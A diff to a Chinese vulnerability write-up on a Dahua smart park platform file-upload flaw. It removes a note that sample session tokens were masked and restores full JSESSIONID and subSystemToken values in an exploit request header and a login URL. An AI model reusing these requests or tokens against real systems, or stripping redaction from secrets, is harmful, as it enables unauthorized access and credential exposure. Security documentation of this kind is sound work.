@@ -39,7 +39,6 @@ relation_type: "duplicate_of"
 - 缺创建返回/角色1含义与匿名会话来源；软件管理平台分类应明确
 - 已落实的文本修订：HTTP 报文围栏改为 http；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
 - user_save.action 请求的直接作用是创建账户；上传是后续另一步，原文没有完整上传请求。标题已按可见账户操作校正，仍保留加密字段、会话、截图及后续路径线索。
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -81,7 +80,7 @@ Host:
 Accept-Encoding: gzip
 Content-Length: 914
 Content-Type: multipart/form-data; boundary=----fxwrpqcy
-Cookie: JSESSIONID=65A**************************21C
+Cookie: JSESSIONID=65A8F19555DC1EFB09B5A8B4F0F6921C
 User-Agent: Go-http-client/1.1
 
 ------fxwrpqcy
@@ -159,7 +158,7 @@ User-Agent: Go-http-client/1.1
 ![image-20230704114644296](./.resource/大华智慧园区综合管理平台user_save.action任意文件上传漏洞/media/image-20230704114644296.png)
 
 ```
-/admin/login_login.action?subSystemToken=87a**************************7f7
+/admin/login_login.action?subSystemToken=87a629bc14298c1533d8b52dd63e87f7
 ```
 
 ![image-20230704114655894](./.resource/大华智慧园区综合管理平台user_save.action任意文件上传漏洞/media/image-20230704114655894.png)
